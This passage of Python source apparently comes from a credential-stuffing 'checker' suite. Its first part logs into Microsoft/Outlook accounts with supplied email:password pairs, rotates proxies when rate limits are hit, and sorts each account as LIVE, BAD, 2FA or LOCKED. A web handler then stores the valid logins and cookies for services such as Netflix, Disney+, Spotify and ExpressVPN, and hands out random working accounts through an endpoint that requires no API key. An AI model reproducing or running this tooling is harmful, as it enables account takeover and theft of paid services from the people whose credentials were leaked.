            proxy_raw_url = proxy_result[2]

    session = requests.Session()
    session.verify = True
    session.headers.update(OUTLOOK_HEADERS)

    if proxies:
        session.proxies = proxies

    try:
        # Step 1: GET login.live.com/oauth20_authorize.srf → extract PPFT + urlPost
        auth_params = dict(OUTLOOK_AUTH_PARAMS)
        auth_params["login_hint"] = email

        r1 = session.get("https://login.live.com/oauth20_authorize.srf",
                         params=auth_params, timeout=20, allow_redirects=True)

        if r1.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        html1 = r1.text
        ppft = None
        url_post = None

        # Try new ServerData JSON format first
        sd_match = re.search(r'var ServerData = ({.*?});', html1, re.DOTALL)
        if sd_match:
            try:
                sd = json.loads(sd_match.group(1))
                url_post = sd.get("urlPost", "")
                sft_tag = sd.get("sFTTag", "")
                ppft_val = re.search(r'value="([^"]+)"', sft_tag)
                if ppft_val:
                    ppft = ppft_val.group(1)
            except (json.JSONDecodeError, AttributeError):
                pass

        # Fallback: try old pattern
        if not ppft:
            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html1)
            if ppft_match:
                ppft = ppft_match.group(1)
        if not url_post:
            url_post_match = re.search(r"urlPost:'([^']+)'", html1)
            if url_post_match:
                url_post = url_post_match.group(1)

        if not ppft or not url_post:
            if "ServiceAbuse" in html1 or "account.live.com/Abuse" in html1:
                save_history(svc_type, "LOCKED", route=route, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "LOCKED", "email": email, "reason": "Account locked (Abuse detected at auth)", "route": route, "service": svc_label}
            save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "email": email, "reason": "Failed to extract login parameters", "route": route, "service": svc_label}

        # Step 2: POST login form
        login_payload = {
            "ps": "2",
            "psRNGCDefaultType": "",
            "psRNGCEntropy": "",
            "psRNGCSLK": "",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": ppft,
            "PPSX": "Pass",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
        }

        post_headers = dict(OUTLOOK_HEADERS)
        post_headers["Content-Type"] = "application/x-www-form-urlencoded"
        post_headers["Referer"] = r1.url
        post_headers["Origin"] = "https://login.live.com"

        r2 = session.post(url_post, data=login_payload, headers=post_headers,
                          timeout=20, allow_redirects=True)

        if r2.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        html2 = r2.text
        final_url = r2.url
        html2_lower = html2.lower()

        # Step 3: Parse response — determine account status

        # Parse ServerData from response if present
        sd2 = {}
        sd2_match = re.search(r'var ServerData = ({.*?});', html2, re.DOTALL)
        if sd2_match:
            try:
                sd2 = json.loads(sd2_match.group(1))
            except json.JSONDecodeError:
                pass

        err_txt = sd2.get("sErrTxt", "")

        # LOCKED
        if "account.live.com/Abuse" in html2 or "ServiceAbuse" in html2:
            save_history(svc_type, "LOCKED", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "LOCKED", "email": email, "reason": "Account locked by Microsoft (Abuse)", "route": route, "service": svc_label}

        # PHONE LOCKED
        if "PhoneLocked" in html2 or "iShowPhoneLock" in html2 or "phoneVerification" in html2:
            save_history(svc_type, "PHONE_LOCKED", plan=f"{svc_label} Phone Locked", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "PHONE_LOCKED", "email": email, "reason": "Phone verification required", "route": route, "service": svc_label}

        # INVALID (wrong password / account doesn't exist)
        bad_indicators = [
            "bad user credential",
            "your account or password is incorrect",
            "that microsoft account doesn't exist",
            "that microsoft account doesn\\'t exist",
            "aadsts50126",
            "aadsts50034",
            "aadsts700016",
            "account doesn't exist",
            "password is incorrect",
            "too many signin attempts",
        ]
        is_invalid = any(ind in html2_lower for ind in bad_indicators)

        # Check ServerData error
        if not is_invalid and err_txt:
            err_lower = err_txt.lower()
            if "incorrect" in err_lower or "doesn't exist" in err_lower or "bad" in err_lower:
                is_invalid = True

        if is_invalid:
            save_history(svc_type, "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "email": email, "reason": "Wrong password or account not found", "route": route, "service": svc_label}

        # 2FA
        twofa_indicators = [
            "identity/confirm", "iShowTwoFactorAuth", "TwoFactorAuth",
            "sProofConfirmation", "iProofOptions", "iSelectProofTitle",
            "ConvergedTFA", "OneTimeCode", "ProofConfirmation",
            "iSignInWithSecurityCode", "arrProofs",
        ]
        if any(ind in html2 for ind in twofa_indicators):
            save_history(svc_type, "2FA", plan=f"{svc_label} 2FA", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "2FA", "email": email, "reason": "Two-factor authentication enabled", "route": route, "service": svc_label}

        # LIVE — successful login indicators
        live_indicators = [
            "code=" in final_url,
            "oauth20_desktop.srf" in final_url,
            "access_token=" in final_url,
            "kmsi" in html2_lower,
            "iShowKmsi" in html2,
            "fmHF" in html2,
            "idSIButton9" in html2 and "urlPost" not in html2,
        ]
        if any(live_indicators):
            save_history(svc_type, "LIVE", plan=f"{svc_label} Valid", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "LIVE", "email": email, "reason": "Account valid and active", "route": route, "service": svc_label}

        if "consent" in final_url.lower() or "msauth://" in final_url:
            save_history(svc_type, "LIVE", plan=f"{svc_label} Valid", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "LIVE", "email": email, "reason": "Account valid (consent redirect)", "route": route, "service": svc_label}

        # UNKNOWN
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": "Could not determine account status", "route": route, "service": svc_label}

    except requests.exceptions.Timeout:
        if proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)
        if use_proxy:
            return check_outlook_account(email, password, use_proxy=False)
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": "Request timed out", "route": route, "service": svc_label}
    except requests.exceptions.ProxyError:
        if proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)
        if use_proxy:
            return check_outlook_account(email, password, use_proxy=False)
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": "Proxy connection failed", "route": route, "service": svc_label}
    except Exception as e:
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": f"Request failed: {str(e)[:150]}", "route": route, "service": svc_label}
    finally:
        session.close()


# In-memory sliding window rate limiter
rate_limit_lock = threading.Lock()
ip_request_history = {}

def is_rate_limited(ip, max_requests=40, window_seconds=10, bucket="default"):
    if not ip:
        return False
    key = f"{bucket}:{ip}"
    now = time.time()
    with rate_limit_lock:
        # Bound memory under address churn; prune expired buckets opportunistically.
        if len(ip_request_history) > 2000:
            stale = [k for k, values in ip_request_history.items()
                     if not values or now - values[-1] > 300]
            for stale_key in stale:
                ip_request_history.pop(stale_key, None)
        timestamps = ip_request_history.get(key, [])
        # prune timestamps older than window
        timestamps = [t for t in timestamps if now - t < window_seconds]
        if len(timestamps) >= max_requests:
            ip_request_history[key] = timestamps
            return True
        timestamps.append(now)
        ip_request_history[key] = timestamps
        return False

def check_api_key_authorized(headers):
    # Check X-API-Key header or Authorization: Bearer <key>
    key = headers.get('X-API-Key') or ''
    if not key:
        auth = headers.get('Authorization', '')
        if auth.startswith('Bearer '):
            key = auth[7:].strip()
    if not key:
        return False
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT id FROM api_keys WHERE key = ? AND is_active = 1', (key,))
        row = c.fetchone()
        if row:
            c.execute('UPDATE api_keys SET last_used = ? WHERE id = ?', (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), row[0]))
            conn.commit()
        conn.close()
        return row is not None

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def send_cors_headers(self):
        # Same-origin only. Never reflect arbitrary Origin values.
        origin = self.headers.get('Origin')
        host = self.headers.get('Host', '').lower()
        if origin:
            try:
                origin_host = urllib.parse.urlparse(origin).netloc.lower()
                if origin_host and origin_host == host:
                    self.send_header('Access-Control-Allow-Origin', origin)
                    self.send_header('Vary', 'Origin')
                    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                    self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-API-Key, Authorization')
            except (ValueError, TypeError):
                pass
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('Referrer-Policy', 'no-referrer')
        self.send_header('Cache-Control', 'no-store')
        self.send_header('X-Frame-Options', 'DENY')
        self.send_header('Cross-Origin-Resource-Policy', 'same-origin')
        self.send_header('Content-Security-Policy', "default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'")
        self.send_header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains') if self.headers.get('X-Forwarded-Proto', '').lower() == 'https' else None
        

    def do_OPTIONS(self):
        origin = self.headers.get('Origin')
        host = self.headers.get('Host', '').lower()
        origin_host = urllib.parse.urlparse(origin).netloc.lower() if origin else ''
        if origin_host and origin_host != host:
            self.send_response(403)
            self.end_headers()
            return
        self.send_response(204)
        self.send_cors_headers()
        self.end_headers()

    def do_HEAD(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.end_headers()
        elif path in ("/api/health", "/api/auth/status", "/api/proxies"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        global all_tested_proxies, healthy_proxies
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path in ("/", "/index.html"):
            html_file = os.path.join(os.path.dirname(__file__), "index.html")
            if os.path.exists(html_file):
                with open(html_file, "r", encoding="utf-8") as f:
                    content = f.read().encode("utf-8")
            else:
                content = b"<h1>index.html not found</h1>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self' https://*.trycloudflare.com https://*.sawavaganteng.cloud https://cdn.jsdelivr.net")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(content)

        elif path in ("/admin", "/admin/", "/admin.html"):
            html_file = os.path.join(os.path.dirname(__file__), "admin.html")
            if os.path.exists(html_file):
                with open(html_file, "r", encoding="utf-8") as f:
                    content = f.read().encode("utf-8")
            else:
                content = b"<h1>admin.html not found</h1>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(content)

        elif path == "/favicon.ico":
            fav = b'''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><rect width="24" height="24" rx="5" fill="#07090e"/><path d="M12 2L2 7l10 5 10-5-10-5Z" stroke="#e50914" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/><path d="m2 17 10 5 10-5" stroke="#06b6d4" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/><path d="m2 12 10 5 10-5" stroke="#3b82f6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>'''
            self.send_response(200)
            self.send_header("Content-Type", "image/svg+xml")
            self.send_header("Cache-Control", "public, max-age=86400")
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(fav)

        elif path == "/api/health":
            uptime = int(time.time() - server_start_time)
            with proxy_lock:
                h_proxies = len(healthy_proxies)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            res = {
                "status": "healthy",
                "uptime_seconds": uptime,
                "timestamp": datetime.now().isoformat(),
                "healthy_proxies": h_proxies
            }
            self.wfile.write(json.dumps(res).encode("utf-8"))

        elif path == "/api/auth/status":
            cfg = get_config()
            is_authed = check_api_key_authorized(self.headers)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(json.dumps({"authenticated": is_authed, "method": "api_key"}).encode("utf-8"))

        elif path == "/api/proxies":
            with proxy_lock:
                if not all_tested_proxies:
                    all_tested_proxies = list(load_proxies())
                total_n = len(all_tested_proxies)
                h_count = len(healthy_proxies)
                d_count = len([p for p in all_tested_proxies if p.get("status") == "FAIL"])
                u_count = max(0, total_n - (h_count + d_count))
                active_count = h_count if h_count > 0 else (total_n - d_count)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(json.dumps({
                "total": total_n,
                "healthy": h_count,
                "dead": d_count,
                "unverified": u_count,
                "active": active_count
            }).encode("utf-8"))

        elif path in ('/api/account/random', '/api/random_account'):
            svc = qs.get("service", qs.get("type", ["netflix"]))[0].lower().strip()

            with db_lock:
                conn = get_db()
                c = conn.cursor()
                if svc in ('netflix', 'checker', 'single', 'bulk'):
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('checker', 'netflix', 'single', 'bulk') AND status = 'LIVE' ORDER BY RANDOM() LIMIT 1;")
                elif svc in ('expressvpn', 'evpn'):
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'expressvpn' AND status IN ('LIVE', 'PREMIUM', 'FREE') ORDER BY RANDOM() LIMIT 1;")
                elif svc in ('disney', 'disneyplus'):
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'disney' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
                elif svc in ('crunchyroll', 'cr'):
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'crunchyroll' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
                elif svc in ('spotify', 'sp'):
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'spotify' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
                elif svc in ('outlook', 'hotmail', 'ms'):
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('outlook', 'hotmail') AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
                else:
                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
                row = c.fetchone()
                conn.close()

            if row:
                r_id, r_type, r_status, r_email, r_cookie, r_token, r_plan, r_country = row
                content_to_copy = r_cookie or r_token or r_email
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": True,
                    "id": r_id,
                    "service": r_type,
                    "status": r_status,
                    "email": r_email,
                    "content": content_to_copy,
                    "plan": r_plan or "Active",
                    "country": r_country or "-"
                }).encode('utf-8'))
            else:
                self.send_response(404)
                self.send_header('Content-Type', 'application/json')
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": False,
                    "error": f"Belum ada akun/cookie LIVE untuk layanan '{svc}' di database."
                }).encode('utf-8'))

        elif path == '/api/version':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(json.dumps({
                'version': '8.0.0',
                'codename': 'Fortress',
                'auth': 'api_key',
                'services': ['netflix', 'disney', 'disney-cookie', 'crunchyroll', 'crunchyroll-cookie', 'expressvpn', 'spotify', 'outlook', 'hotmail'],
                'python': platform.python_version(),
                'uptime': int(time.time() - server_start_time)
            }).encode('utf-8'))

        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail", "/api/proxies/export"):
            # API key required for data/history endpoints
            if not check_api_key_authorized(self.headers):
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"error": "Unauthorized: API Key required"}')
                return

            if path == "/api/history":
                limit = int(qs.get("limit", [25])[0])
                offset = int(qs.get("offset", [0])[0])
                search = qs.get("search", [""])[0]
                status = qs.get("status", [""])[0]
                plan = qs.get("plan", [""])[0]
                entry_type = qs.get("type", [""])[0]

                data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan, entry_type=entry_type)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(data).encode("utf-8"))

            elif path == "/api/history/export_csv":
                search = qs.get("search", [""])[0]
                status = qs.get("status", [""])[0]
                plan = qs.get("plan", [""])[0]
                entry_type = qs.get("type", [""])[0]
                csv_data = export_history_csv(search=search, status=status, plan=plan, entry_type=entry_type)
                self.send_response(200)
                self.send_header("Content-Type", "text/csv; charset=utf-8")
                self.send_header("Content-Disposition", f"attachment; filename=suite_history_{int(time.time())}.csv")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(csv_data.encode("utf-8"))

            elif path == "/api/analytics":
                an = get_analytics()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(an).encode("utf-8"))

            elif path == "/api/proxies/detail":
                page = max(1, int(qs.get("page", [1])[0]))
                limit = min(500, max(10, int(qs.get("limit", [50])[0])))
                status_filter = qs.get("status", ["ALL"])[0].upper().strip()
                search_q = qs.get("search", [""])[0].lower().strip()

                with proxy_lock:
                    if not all_tested_proxies:
                        all_tested_proxies = load_proxies()
                    total_all = len(all_tested_proxies)
                    healthy_all = len(healthy_proxies)
                    dead_items = [p for p in all_tested_proxies if p.get("status") == "FAIL"]
                    dead_all = len(dead_items)
                    unverified_all = max(0, total_all - (healthy_all + dead_all))
                    active_all = healthy_all if healthy_all > 0 else (total_all - dead_all)

                    if status_filter in ("OK", "LIVE"):
                        source_list = healthy_proxies
                    elif status_filter in ("FAIL", "DEAD"):
                        source_list = dead_items
                    elif status_filter in ("UNVERIFIED", "UNTESTED", "READY"):
                        source_list = [p for p in all_tested_proxies if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
                    else:
                        source_list = all_tested_proxies

                    if search_q:
                        filtered = [
                            p for p in source_list
                            if search_q in (p.get("raw") or "").lower()
                            or search_q in (p.get("proxy") or "").lower()
                            or search_q in (p.get("line") or "").lower()
                        ]
                    else:
                        filtered = source_list

                    filtered_total = len(filtered)
                    total_pages = max(1, (filtered_total + limit - 1) // limit)
                    page = min(page, total_pages)
                    start_idx = (page - 1) * limit
                    end_idx = start_idx + limit
                    items_page = filtered[start_idx:end_idx]

                with proxy_test_lock:
                    t_info = dict(proxy_test_state)

                avg_latency = 0
                if healthy_proxies:
                    lats = [p.get("latency", 0) for p in healthy_proxies if p.get("latency", 0) > 0]
                    if lats:
                        avg_latency = int(sum(lats) / len(lats))

                res_payload = {
                    "total": total_all,
                    "healthy_count": healthy_all,
                    "dead_count": dead_all,
                    "unverified_count": unverified_all,
                    "active_count": active_all,
                    "avg_latency": avg_latency,
                    "filtered_total": filtered_total,
                    "page": page,
                    "limit": limit,
                    "total_pages": total_pages,
                    "testing": t_info.get("running", False),
                    "test_progress": t_info,
                    "list": items_page
                }
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(res_payload).encode("utf-8"))

            elif path == "/api/proxies/export":
                mode = qs.get("mode", ["healthy"])[0].lower()
                with proxy_lock:
                    if not all_tested_proxies:
                        all_tested_proxies = list(load_proxies())
                    p_list = list(all_tested_proxies)
                if mode == "healthy":
                    lines = [p.get("line") or p.get("proxy") for p in p_list if p.get("status") == "OK"]
                    fname = f"healthy_proxies_{int(time.time())}.txt"
                else:
                    lines = [p.get("line") or p.get("proxy") for p in p_list]
                    fname = f"all_proxies_{int(time.time())}.txt"
                out_txt = "\n".join([l for l in lines if l])
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Disposition", f"attachment; filename={fname}")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(out_txt.encode("utf-8"))

        elif path in ('/admin', '/admin/'):
            admin_file = os.path.join(os.path.dirname(__file__), 'admin.html')
            if os.path.exists(admin_file):
                with open(admin_file, 'r', encoding='utf-8') as f:
                    content = f.read().encode('utf-8')
            else:
                content = b'<h1>admin.html not found</h1>'
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self'")
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(content)

        else:
            # Serve only explicit public assets; never expose source, database, config, logs,
            # proxy credentials, backups, or arbitrary files from the application directory.
            safe_root = os.path.realpath(os.path.dirname(__file__))
            clean_path = urllib.parse.unquote(path).lstrip("/")
            req_file = os.path.realpath(os.path.join(safe_root, clean_path))
            allowed_public_files = {"index.html", "styles_redesign.css", "favicon.ico", "admin.html"}
            inside_root = os.path.commonpath((safe_root, req_file)) == safe_root
            public_path = os.path.relpath(req_file, safe_root).replace("\\", "/")
            if (inside_root and os.path.isfile(req_file)
                    and public_path in allowed_public_files
                    and not any(part.startswith(".") for part in public_path.split("/"))):
                ext = os.path.splitext(req_file)[1].lower()
                mime_map = {
                    ".css": "text/css; charset=utf-8",
                    ".js": "application/javascript; charset=utf-8",
                    ".json": "application/json; charset=utf-8",
                    ".svg": "image/svg+xml",
                    ".png": "image/png",
                    ".jpg": "image/jpeg",
                    ".jpeg": "image/jpeg",
                    ".ico": "image/x-icon",
                    ".txt": "text/plain; charset=utf-8",
                    ".html": "text/html; charset=utf-8"
                }
                ctype = mime_map.get(ext, "application/octet-stream")
                try:
                    with open(req_file, "rb") as sf:
                        s_data = sf.read()
                    self.send_response(200)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Cache-Control", "public, max-age=3600")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(s_data)
                    return
                except Exception:
                    pass

            self.send_response(404)
            self.send_cors_headers()
            self.end_headers()

    def do_POST(self):
        # Reject malformed and oversized requests before reading attacker-controlled bodies.
        try:
            clen = int(self.headers.get("Content-Length", 0))
        except (TypeError, ValueError):
            self.send_error(400, "Invalid Content-Length")
            return
        max_body_size = 10 * 1024 * 1024
        if clen < 0:
            self.send_error(400, "Invalid Content-Length")
            return
        if clen > max_body_size:
            self.send_error(413, "Payload Too Large")
            return
        body = self.rfile.read(clen) if clen > 0 else b"{}"
        # Do not trust client-supplied forwarding headers for rate-limit identity.
        client_ip = self.client_address[0]

        # Sensitive routes are now protected by API key auth below.
        # No blanket disable — all checker routes work when API key is provided.

        if self.path in ("/api/admin/keys", "/api/admin/config", "/api/admin/system"):
            if is_rate_limited(client_ip, max_requests=50, window_seconds=60, bucket="admin"):
                self.send_response(429)
                self.send_header("Content-Type", "application/json")
                self.send_header("Retry-After", "60")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"error": "Too Many Requests: admin rate limit exceeded."}')
                return
            if not check_api_key_authorized(self.headers):
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"error": "Unauthorized: API Key required"}')
                return
            try:
                p = json.loads(body.decode("utf-8")) if body else {}
            except Exception:
                self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"error": "Invalid JSON body"}')
                return

            if self.path == "/api/admin/keys":
                action = p.get("action", "")
                if action == "list":
                    with db_lock:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute('SELECT id, key, label, created_at, last_used, is_active FROM api_keys')
                        rows = c.fetchall()
                        conn.close()
                    keys_list = []
                    for r in rows:
                        masked = r[1][:8] + '...' + r[1][-4:] if len(r[1]) > 12 else '****'
                        keys_list.append({"id": r[0], "key_masked": masked, "label": r[2], "created_at": r[3], "last_used": r[4], "is_active": bool(r[5])})
                    result = {"keys": keys_list}
                elif action == "create":
                    import secrets as _secrets
                    new_key = _secrets.token_hex(16)
                    label = str(p.get("label", "")).strip() or "Unnamed Key"
                    now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    with db_lock:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute('INSERT INTO api_keys (key, label, created_at, is_active) VALUES (?, ?, ?, 1)', (new_key, label, now_str))
                        new_id = c.lastrowid
                        conn.commit()
                        conn.close()
                    result = {"id": new_id, "key": new_key, "label": label, "created_at": now_str}
                elif action == "revoke":
                    key_id = p.get("id")
                    if not key_id:
                        self.send_response(400)
                        self.send_header("Content-Type", "application/json")
                        self.send_cors_headers()
                        self.end_headers()
                        self.wfile.write(b'{"error": "Missing id"}')
                        return
                    with db_lock:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute('UPDATE api_keys SET is_active = 0 WHERE id = ?', (key_id,))
                        conn.commit()
                        conn.close()
                    result = {"ok": True, "revoked": key_id}
                elif action == "delete":
                    key_id = p.get("id")
                    if not key_id:
                        self.send_response(400)
                        self.send_header("Content-Type", "application/json")
                        self.send_cors_headers()
                        self.end_headers()
                        self.wfile.write(b'{"error": "Missing id"}')
                        return
                    with db_lock:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute('DELETE FROM api_keys WHERE id = ?', (key_id,))
                        conn.commit()
                        conn.close()
                    result = {"ok": True, "deleted": key_id}
                else:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": f"Unknown action: {action}"}).encode("utf-8"))
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(result).encode("utf-8"))

            elif self.path == "/api/admin/config":
                action = p.get("action", "")
                if action == "get":
                    cfg = get_config()
                    safe_cfg = {k: v for k, v in cfg.items() if k != "api_key"}
                    result = {"config": safe_cfg}
                elif action == "set":
                    cfg_key = p.get("key", "")
                    cfg_val = p.get("value")
                    if not cfg_key or cfg_key == "api_key":
                        self.send_response(400)
                        self.send_header("Content-Type", "application/json")
                        self.send_cors_headers()
                        self.end_headers()
                        self.wfile.write(b'{"error": "Invalid or protected config key"}')
                        return
                    cfg = get_config()
                    parts = cfg_key.split(".")
                    target = cfg
                    for part in parts[:-1]:
                        if part not in target or not isinstance(target[part], dict):
                            target[part] = {}
                        target = target[part]
                    target[parts[-1]] = cfg_val
                    save_config(cfg)
                    result = {"ok": True, "key": cfg_key, "value": cfg_val}
                else:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": f"Unknown action: {action}"}).encode("utf-8"))
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(result).encode("utf-8"))

            elif self.path == "/api/admin/system":
                action = p.get("action", "")
                if action == "info":
                    import psutil
                    try:
                        mem = psutil.Process(os.getpid()).memory_info().rss
                    except Exception:
                        mem = 0
                    db_size = os.path.getsize(DB_FILE) if os.path.exists(DB_FILE) else 0
                    with db_lock:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute('SELECT COUNT(*) FROM history')
                        hist_count = c.fetchone()[0]
                        conn.close()
                    with proxy_lock:
                        proxy_count = len(all_tested_proxies)
                    result = {
                        "version": "8.0.0",
                        "uptime": int(time.time() - server_start_time),
                        "python": platform.python_version(),
                        "db_size": db_size,
                        "proxy_count": proxy_count,
                        "history_count": hist_count,
                        "memory_usage": mem
                    }
                elif action == "restart":
                    result = {"status": "reloading"}
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps(result).encode("utf-8"))
                    def _do_exit():
                        time.sleep(0.5)
                        os._exit(0)
                    threading.Thread(target=_do_exit, daemon=True).start()
                    return
                elif action == "clear_logs":
                    try:
                        with open(LOG_FILE, 'w', encoding='utf-8') as lf:
                            lf.truncate(0)
                        result = {"ok": True, "message": "Logs cleared"}
                    except Exception as e:
                        result = {"ok": False, "error": str(e)}
                else:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
